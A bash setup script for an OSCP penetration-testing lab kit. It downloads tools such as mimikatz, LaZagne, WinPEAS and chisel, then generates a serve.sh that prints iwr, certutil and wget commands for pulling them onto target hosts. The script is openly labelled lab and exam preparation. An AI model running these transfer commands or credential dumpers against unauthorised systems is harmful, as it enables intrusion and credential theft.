#!/bin/bash
# OSCP Pentest Toolkit - Light (Automatic Setup)
# Usage: chmod +x setup_light.sh && ./setup_light.sh

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
ok()   { echo -e "  ${GREEN}[+]${NC} $1"; }
fail() { echo -e "  ${RED}[-]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }

TOOLS="$HOME/Desktop/ctf-tools"
mkdir -p "$TOOLS"

# ──────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────

download() {
    # $1=url  $2=filename  $3=tool_name
    if curl -sL --max-time 60 -o "$TOOLS/$2" "$1" \
       && [ -s "$TOOLS/$2" ] \
       && [ "$(stat -c%s "$TOOLS/$2" 2>/dev/null)" -gt 200 ]; then
        ok "$3"
    else
        rm -f "$TOOLS/$2"
        fail "$3"
    fi
}

gh_latest() {
    # $1=owner/repo  $2=asset_pattern (extended regex)
    curl -sL "https://api.github.com/repos/$1/releases/latest" \
        | grep "browser_download_url" \
        | grep -iE "$2" \
        | head -1 \
        | cut -d'"' -f4
}

copy_if_exists() {
    # $1=filename  $2=tool_name
    SRC=$(find /usr/share /opt 2>/dev/null -name "$1" | head -1)
    if [ -n "$SRC" ]; then
        cp "$SRC" "$TOOLS/" && ok "$2 (kali built-in)"
        return 0
    fi
    return 1
}

echo ""
echo -e "${BLUE}╔══════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   OSCP Toolkit Light Auto-Setup      ║${NC}"
echo -e "${BLUE}║      → $TOOLS${NC}"
echo -e "${BLUE}╚══════════════════════════════════════╝${NC}"
echo ""

# ──────────────────────────────────────────────────────
# 1. Copy Kali built-ins
# ──────────────────────────────────────────────────────
echo -e "${YELLOW}[1/4] Kali built-ins...${NC}"

copy_if_exists "winPEASx64.exe"  "WinPEAS x64"
copy_if_exists "winPEAS.bat"     "WinPEAS.bat"
copy_if_exists "linpeas.sh"      "LinPEAS"
copy_if_exists "PowerUp.ps1"     "PowerUp.ps1"
copy_if_exists "PowerView.ps1"   "PowerView.ps1"
copy_if_exists "powercat.ps1"    "powercat.ps1"
copy_if_exists "nc.exe"          "nc.exe"
copy_if_exists "pspy64"          "pspy64"
copy_if_exists "mimikatz.exe"    "mimikatz.exe"

CHISEL_BIN=$(which chisel 2>/dev/null || find /usr /opt 2>/dev/null -name "chisel" | head -1)
if [ -n "$CHISEL_BIN" ]; then
    cp "$CHISEL_BIN" "$TOOLS/chisel_linux" && ok "chisel linux (kali built-in)"
fi

echo ""

# ──────────────────────────────────────────────────────
# 2. Download from GitHub
# ──────────────────────────────────────────────────────
echo -e "${YELLOW}[2/4] Downloading from GitHub...${NC}"

# WinPEAS
[ ! -f "$TOOLS/winPEASx64.exe" ] && {
    URL=$(gh_latest "peass-ng/PEASS-ng" "winPEASx64\\.exe")
    [ -n "$URL" ] && download "$URL" "winPEASx64.exe" "WinPEAS x64"
}

# LinPEAS
[ ! -f "$TOOLS/linpeas.sh" ] && {
    URL=$(gh_latest "peass-ng/PEASS-ng" "linpeas\\.sh")
    [ -n "$URL" ] && download "$URL" "linpeas.sh" "LinPEAS"
}
chmod +x "$TOOLS/linpeas.sh" 2>/dev/null

# PowerUp
[ ! -f "$TOOLS/PowerUp.ps1" ] && download \
    "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
    "PowerUp.ps1" "PowerUp.ps1"

# PowerView
[ ! -f "$TOOLS/PowerView.ps1" ] && download \
    "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
    "PowerView.ps1" "PowerView.ps1"

# powercat
[ ! -f "$TOOLS/powercat.ps1" ] && download \
    "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" \
    "powercat.ps1" "powercat.ps1"

# PrivescCheck (release asset; no flat raw URL exists)
[ ! -f "$TOOLS/PrivescCheck.ps1" ] && {
    URL=$(gh_latest "itm4n/PrivescCheck" "PrivescCheck\\.ps1")
    [ -n "$URL" ] && download "$URL" "PrivescCheck.ps1" "PrivescCheck.ps1"
}

# SharpHound .ps1 (legacy BloodHound v4 collector)
[ ! -f "$TOOLS/SharpHound.ps1" ] && download \
    "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" \
    "SharpHound.ps1" "SharpHound.ps1"

# SharpHound .exe (SpecterOps ships a versioned zip; extract)
[ ! -f "$TOOLS/SharpHound.exe" ] && {
    URL=$(gh_latest "SpecterOps/SharpHound" "SharpHound.*\\.zip")
    if [ -n "$URL" ]; then
        TMP=$(mktemp -d)
        curl -sL -o "$TMP/sh.zip" "$URL"
        unzip -o "$TMP/sh.zip" -d "$TMP" >/dev/null 2>&1
        SH=$(find "$TMP" -name "SharpHound.exe" | head -1)
        [ -n "$SH" ] && cp "$SH" "$TOOLS/SharpHound.exe" && ok "SharpHound.exe" || fail "SharpHound.exe"
        rm -rf "$TMP"
    fi
}

# nc.exe
[ ! -f "$TOOLS/nc.exe" ] && download \
    "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" \
    "nc.exe" "nc.exe"

# SigmaPotato
[ ! -f "$TOOLS/SigmaPotato.exe" ] && {
    URL=$(gh_latest "tylerdotrar/SigmaPotato" "SigmaPotato\\.exe")
    [ -n "$URL" ] && download "$URL" "SigmaPotato.exe" "SigmaPotato.exe"
}

# pspy64 (Linux process snooper) - match exact pspy64 (not pspy64s) by trailing quote
[ ! -f "$TOOLS/pspy64" ] && {
    URL=$(gh_latest "DominicBreuker/pspy" "/pspy64\"")
    [ -n "$URL" ] && download "$URL" "pspy64" "pspy64"
    chmod +x "$TOOLS/pspy64" 2>/dev/null
}

# Linux Exploit Suggester
[ ! -f "$TOOLS/linux-exploit-suggester.sh" ] && download \
    "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
    "linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
chmod +x "$TOOLS/linux-exploit-suggester.sh" 2>/dev/null

# mimikatz.exe (extract x64 build from mimikatz_trunk.zip)
[ ! -f "$TOOLS/mimikatz.exe" ] && {
    URL=$(gh_latest "gentilkiwi/mimikatz" "mimikatz_trunk\\.zip")
    if [ -n "$URL" ]; then
        TMP=$(mktemp -d)
        curl -sL -o "$TMP/m.zip" "$URL"
        unzip -o "$TMP/m.zip" -d "$TMP" >/dev/null 2>&1
        MIMI=$(find "$TMP" -path "*/x64/mimikatz.exe" | head -1)
        [ -n "$MIMI" ] && cp "$MIMI" "$TOOLS/mimikatz.exe" && ok "mimikatz.exe" || fail "mimikatz.exe"
        rm -rf "$TMP"
    fi
}

# LaZagne.exe (Windows credential dumper)
[ ! -f "$TOOLS/LaZagne.exe" ] && {
    URL=$(gh_latest "AlessandroZ/LaZagne" "lazagne.*\\.exe")
    [ -n "$URL" ] && download "$URL" "LaZagne.exe" "LaZagne.exe"
}

# Chisel (linux)
ARCH=$(uname -m); [ "$ARCH" = "x86_64" ] && ARCH="amd64"
[ ! -f "$TOOLS/chisel_linux" ] && {
    URL=$(gh_latest "jpillora/chisel" "chisel.*linux_${ARCH}.*\\.gz")
    if [ -n "$URL" ]; then
        TMP=$(mktemp)
        curl -sL -o "$TMP" "$URL"
        gunzip -c "$TMP" > "$TOOLS/chisel_linux" 2>/dev/null || cp "$TMP" "$TOOLS/chisel_linux"
        chmod +x "$TOOLS/chisel_linux" && ok "chisel (linux)" || fail "chisel (linux)"
        rm -f "$TMP"
    fi
}

# Chisel (windows)
[ ! -f "$TOOLS/chisel.exe" ] && {
    URL=$(gh_latest "jpillora/chisel" "chisel.*windows_amd64.*\\.gz")
    if [ -n "$URL" ]; then
        TMP=$(mktemp)
        curl -sL -o "$TMP" "$URL"
        gunzip -c "$TMP" > "$TOOLS/chisel.exe" 2>/dev/null || cp "$TMP" "$TOOLS/chisel.exe"
        ok "chisel.exe" || fail "chisel.exe"
        rm -f "$TMP"
    fi
}

# Ligolo-ng proxy (linux) - stays on Kali
[ ! -f "$TOOLS/ligolo_proxy" ] && {
    URL=$(gh_latest "nicocha30/ligolo-ng" "proxy.*linux_amd64\\.tar\\.gz")
    if [ -n "$URL" ]; then
        TMP=$(mktemp --suffix=.tar.gz)
        curl -sL -o "$TMP" "$URL"
        EXTRACT=$(mktemp -d)
        tar xzf "$TMP" -C "$EXTRACT" 2>/dev/null
        PROXY=$(find "$EXTRACT" -maxdepth 2 -name "proxy" -type f | head -1)
        [ -n "$PROXY" ] && mv "$PROXY" "$TOOLS/ligolo_proxy" && chmod +x "$TOOLS/ligolo_proxy" && ok "ligolo-ng proxy (linux)" || fail "ligolo-ng proxy"
        rm -rf "$TMP" "$EXTRACT"
    fi
}

# Ligolo-ng agent (linux) - for linux pivot hosts
[ ! -f "$TOOLS/ligolo_agent_linux" ] && {
    URL=$(gh_latest "nicocha30/ligolo-ng" "agent.*linux_amd64\\.tar\\.gz")
    if [ -n "$URL" ]; then
        TMP=$(mktemp --suffix=.tar.gz)
        curl -sL -o "$TMP" "$URL"
        EXTRACT=$(mktemp -d)
        tar xzf "$TMP" -C "$EXTRACT" 2>/dev/null
        AGENT=$(find "$EXTRACT" -maxdepth 2 -name "agent" -type f | head -1)
        [ -n "$AGENT" ] && mv "$AGENT" "$TOOLS/ligolo_agent_linux" && chmod +x "$TOOLS/ligolo_agent_linux" && ok "ligolo-ng agent (linux)" || fail "ligolo-ng agent (linux)"
        rm -rf "$TMP" "$EXTRACT"
    fi
}

# Ligolo-ng agent (windows)
[ ! -f "$TOOLS/ligolo_agent.exe" ] && {
    URL=$(gh_latest "nicocha30/ligolo-ng" "agent.*windows_amd64\\.zip")
    if [ -n "$URL" ]; then
        TMP=$(mktemp --suffix=.zip)
        curl -sL -o "$TMP" "$URL"
        EXTRACT=$(mktemp -d)
        unzip -o "$TMP" -d "$EXTRACT" >/dev/null 2>&1
        AGENT=$(find "$EXTRACT" -name "agent.exe" | head -1)
        [ -n "$AGENT" ] && mv "$AGENT" "$TOOLS/ligolo_agent.exe" && ok "ligolo-ng agent.exe" || fail "ligolo-ng agent.exe"
        rm -rf "$TMP" "$EXTRACT"
    fi
}

# kerbrute (linux)
[ ! -f "$TOOLS/kerbrute_linux" ] && {
    URL=$(gh_latest "ropnop/kerbrute" "kerbrute_linux_amd64")
    if [ -n "$URL" ]; then
        download "$URL" "kerbrute_linux" "kerbrute (linux)"
        chmod +x "$TOOLS/kerbrute_linux"
    fi
}

# kerbrute (windows)
[ ! -f "$TOOLS/kerbrute.exe" ] && {
    URL=$(gh_latest "ropnop/kerbrute" "kerbrute_windows_amd64\\.exe")
    [ -n "$URL" ] && download "$URL" "kerbrute.exe" "kerbrute.exe"
}

echo ""

# ──────────────────────────────────────────────────────
# 3. Apt package check
# ──────────────────────────────────────────────────────
echo -e "${YELLOW}[3/4] Checking Kali apt packages...${NC}"

MISSING=()
kali_check() {
    if command -v "$1" &>/dev/null || dpkg -l "$2" &>/dev/null 2>&1; then
        ok "$2"
    else
        warn "$2 missing"
        MISSING+=("$2")
    fi
}

kali_check "responder"         "responder"
kali_check "bloodhound"        "bloodhound"
kali_check "neo4j"             "neo4j"
kali_check "evil-winrm"        "evil-winrm"
kali_check "crackmapexec"      "crackmapexec"
kali_check "impacket-psexec"   "python3-impacket"
kali_check "hashcat"           "hashcat"
kali_check "john"              "john"
kali_check "hydra"             "hydra"
kali_check "sqlmap"            "sqlmap"
kali_check "gobuster"          "gobuster"
kali_check "smbclient"         "smbclient"
kali_check "ncat"              "ncat"
kali_check "socat"             "socat"
kali_check "proxychains4"      "proxychains4"
kali_check "sshuttle"          "sshuttle"
kali_check "exiftool"          "libimage-exiftool-perl"
kali_check "enum4linux-ng"     "enum4linux-ng"
kali_check "dnsrecon"          "dnsrecon"

if [ ${#MISSING[@]} -gt 0 ]; then
    echo ""
    warn "Install missing packages:"
    echo -e "  ${BLUE}sudo apt install -y ${MISSING[*]}${NC}"
fi

echo ""

# ──────────────────────────────────────────────────────
# 4. Generate serve.sh
# ──────────────────────────────────────────────────────
echo -e "${YELLOW}[4/4] Generating serve.sh...${NC}"

cat > "$TOOLS/serve.sh" << 'SERVE'
#!/bin/bash
PORT=${1:-8000}
IP=$(ip route get 1 2>/dev/null | awk '{print $7;exit}')
echo ""
echo "[*] Serving: http://$IP:$PORT"
echo ""
echo "── Windows (iwr) ──────────────────────────────"
echo "  iwr -uri http://$IP:$PORT/winPEASx64.exe -Outfile winpeas.exe"
echo "  iwr -uri http://$IP:$PORT/nc.exe -Outfile nc.exe"
echo "  iwr -uri http://$IP:$PORT/PowerUp.ps1 -Outfile PowerUp.ps1"
echo "  iwr -uri http://$IP:$PORT/PowerView.ps1 -Outfile PowerView.ps1"
echo "  iwr -uri http://$IP:$PORT/SharpHound.ps1 -Outfile SharpHound.ps1"
echo "  iwr -uri http://$IP:$PORT/SigmaPotato.exe -Outfile SigmaPotato.exe"
echo "  iwr -uri http://$IP:$PORT/mimikatz.exe -Outfile mimikatz.exe"
echo "  iwr -uri http://$IP:$PORT/LaZagne.exe -Outfile LaZagne.exe"
echo "  iwr -uri http://$IP:$PORT/chisel.exe -Outfile chisel.exe"
echo "  iwr -uri http://$IP:$PORT/ligolo_agent.exe -Outfile ligolo_agent.exe"
echo "  iwr -uri http://$IP:$PORT/kerbrute.exe -Outfile kerbrute.exe"
echo ""
echo "── Windows (certutil) ─────────────────────────"
echo "  certutil -urlcache -f http://$IP:$PORT/nc.exe C:\Windows\Temp\nc.exe"
echo ""
echo "── Linux ──────────────────────────────────────"
echo "  wget http://$IP:$PORT/linpeas.sh && chmod +x linpeas.sh"
echo "  wget http://$IP:$PORT/pspy64 && chmod +x pspy64"
echo "  wget http://$IP:$PORT/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh"
echo "  wget http://$IP:$PORT/chisel_linux && chmod +x chisel_linux"
echo "  wget http://$IP:$PORT/ligolo_agent_linux && chmod +x ligolo_agent_linux"
echo ""
echo "── Ligolo-ng (Kali) ───────────────────────────"
echo "  sudo ./ligolo_proxy -selfcert"
echo ""
cd "$(dirname "$0")" && python3 -m http.server $PORT
SERVE
chmod +x "$TOOLS/serve.sh"
ok "serve.sh"

# ──────────────────────────────────────────────────────
# Summary
# ──────────────────────────────────────────────────────
echo ""
echo -e "${BLUE}══════════════════════════════════════${NC}"
echo -e "${GREEN}[✓] Done → $TOOLS${NC}"
echo ""
echo "Files:"
find "$TOOLS" -type f | sort | while read f; do
    SIZE=$(du -sh "$f" 2>/dev/null | cut -f1)
    printf "  %-40s %s\n" "$(basename $f)" "$SIZE"
done
echo ""
echo -e "HTTP serve:  ${BLUE}$TOOLS/serve.sh [port]${NC}"
echo -e "SMB serve:   ${BLUE}impacket-smbserver share $TOOLS -smb2support${NC}"
echo ""
